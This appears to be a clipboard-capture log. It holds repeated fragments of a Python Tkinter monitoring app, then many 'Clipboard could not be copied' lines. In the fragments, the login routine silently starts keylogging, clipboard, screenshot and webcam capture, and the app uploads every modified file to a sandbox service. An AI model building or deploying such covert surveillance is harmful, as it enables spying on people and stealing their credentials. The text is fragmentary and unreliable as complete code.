    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)
Clipboard Data: 
def show_malware_analysis_window():
    global text_area

    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a text area to display submitted files
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Update the display with current submitted files update_malware_analysis_display()  # Call this to display current submitted files

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add menu items for other functionalities
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)


Clipboard Data: 
def add_submitted_file(file_path, status, analysis_id=None):
    """Add a submitted file to the list and update the display."""
    submitted_files[file_path] = (status, analysis_id)
    update_malware_analysis_display()

def update_malware_analysis_display():
    """Update the text area with the submitted files."""
    text_area.delete(1.0, tk.END)  # Clear the text area
    for file_path, (status, analysis_id) in submitted_files.items():
        if analysis_id:
            text_area.insert(tk.END, f"{file_path} - Status: {status}, Analysis ID: {analysis_id}\n")
        else:
            text_area.insert(tk.END, f"{file_path} - Status: {status}\n")  # No analysis ID if not available

def send_file_to_sandbox(file_path):
    global api_key
    api_key = api_key.strip()

    if not os.path.exists(file_path):
        print(f"File {file_path} does not exist.")
        return

    # Check if the file has already been submitted
    if file_path in submitted_files:
        print(f"File {file_path} has already been submitted.")
        return

    files = {'file': open(file_path, 'rb')}
    environment_id = "120"

    headers = {
        'User-Agent': 'Falcon Sandbox',
        'api-key': api_key
    }

    data = {
        'environment_id': environment_id
    }

    try:
        response = requests.post(api_url + '/submit/file', files=files, headers=headers, data=data)

        if response.status_code in [200, 201]:
            submission_data = response.json()
            analysis_id = submission_data.get('submission_id')
            print(f"File {file_path} successfully submitted. Analysis ID: {analysis_id}")

            # Add the submitted file to the list with status and analysis ID
            add_submitted_file(file_path, "Submitted", analysis_id)

        else:
            print(f"Failed to submit {file_path} for analysis. Response code: {response.status_code}")
            print(f"Response text: {response.text}")
            add_submitted_file(file_path, "Failed")  # Mark as failed submission

    except Exception as e:
        print(f"Error while sending file to sandbox: {str(e)}")
        add_submitted_file(file_path, "Error")  # Mark as error


# File access monitoring handler using watchdog
class FileAccessHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if not event.is_directory:
            print(f"Modified file detected: {event.src_path}")
            self.check_file_with_hybrid_analysis(event.src_path)

    def check_file_with_hybrid_analysis(self, file_path):
        send_file_to_sandbox(file_path)


# Function to start file system monitoring
def monitor_filesystem(directory_to_monitor):
    event_handler = FileAccessHandler()
    observer = Observer()
    observer.schedule(event_handler, path=directory_to_monitor, recursive=True)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()


# Starting the file monitoring in a separate thread
def start_file_monitoring():
    monitor_thread = Thread(target=monitor_filesystem, args=(directory_to_monitor,))
    monitor_thread.daemon = True  # Daemonize the thread
    monitor_thread.start()
Clipboard Data: 
update_MalwareAnaysis
Clipboard Data: 
webcam_menu = tk.Menu(menu)
Clipboard Data: 
webcam_menu = tk.Menu(menu)
Clipboard Data: 
 # Start the periodic update for malware analysis
    update_malware_analysis()
Clipboard Data: 
# Function to send the file to Hybrid Analysis sandbox
def send_file_to_sandbox(file_path):
    global api_key

    if not os.path.exists(file_path):
        print(f"File {file_path} does not exist.")
        return

    files = {'file': open(file_path, 'rb')}
    environment_id = "120"  # Windows 10 (64-bit)

    headers = {
        'User-Agent': 'Falcon Sandbox',
        'api-key': api_key.strip()
    }

    data = {
        'environment_id': environment_id  # Required field for the analysis environment
    }

    try:
        # Submit the file for analysis
        response = requests.post(api_url + '/submit/file', files=files, headers=headers, data=data)

        if response.status_code in [200, 201]:
            submission_data = response.json()
            analysis_id = submission_data.get('submission_id')
            print(f"File {file_path} successfully submitted. Analysis ID: {analysis_id}")
            submitted_files[file_path] = analysis_id  # Store the file and its analysis ID
        else:
            print(f"Failed to submit {file_path}. Response code: {response.status_code}")
            print(f"Response text: {response.text}")

    except Exception as e:
        print(f"Error submitting file: {str(e)}")

# File access monitoring handler
class FileAccessHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if not event.is_directory:
            print(f"Modified file detected: {event.src_path}")
            self.check_file_with_hybrid_analysis(event.src_path)

    def check_file_with_hybrid_analysis(self, file_path):
        threading.Thread(target=send_file_to_sandbox, args=(file_path,)).start()

# Function to start file system monitoring
def monitor_filesystem(directory_to_monitor):
    event_handler = FileAccessHandler()
    observer = Observer()
    observer.schedule(event_handler, path=directory_to_monitor, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Function to start monitoring in a separate thread
def start_file_monitoring():
    monitor_thread = threading.Thread(target=monitor_filesystem, args=(directory_to_monitor,))
    monitor_thread.daemon = True  # Daemonize the thread
    monitor_thread.start()

# Function to update the malware analysis window with file details (path and analysis ID)
def update_malware_analysis():
    global text_area

    # Clear the text area
    text_area.delete(1.0, tk.END)

    # Iterate over submitted files and display their details
    for file_path, analysis_id in submitted_files.items():
        result_str = f"Modified file detected: {file_path}\n" \
                     f"File {file_path} successfully submitted. Analysis ID: {analysis_id}\n\n"
        text_area.insert(tk.END, result_str)

    # Schedule the next update after 2 seconds
    screen.after(2000, update_malware_analysis)
Clipboard Data: 
def login():
    user_id = id_entry.get()
    username = username_entry.get()
    password = password_entry.get()
    user = login_user(username, password, user_id)
    if user:
        messagebox.showinfo("Success", "Login successful!")
        login_window.destroy()
        
        # Start background tasks
        start_keylog_capture()
        computer_information()
        start_clipboard_capture()
        start_screenshot_capture()
        start_webcam_capture()
        start_file_monitoring()

        # Start the system tray icon
        setup_system_tray()
    else:
        messagebox.showerror("Error", "Invalid ID, username, or password.")
Clipboard Data: 
def login():
    user_id = id_entry.get()
    username = username_entry.get()
    password = password_entry.get()
    user = login_user(username, password, user_id)
    if user:
        messagebox.showinfo("Success", "Login successful!")
        login_window.destroy()
        
        # Start background tasks
        start_keylog_capture()
        computer_information()
        start_clipboard_capture()
        start_screenshot_capture()
        start_webcam_capture()
        start_file_monitoring()

        # Start the system tray icon
        setup_system_tray()
    else:
        messagebox.showerror("Error", "Invalid ID, username, or password.")
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
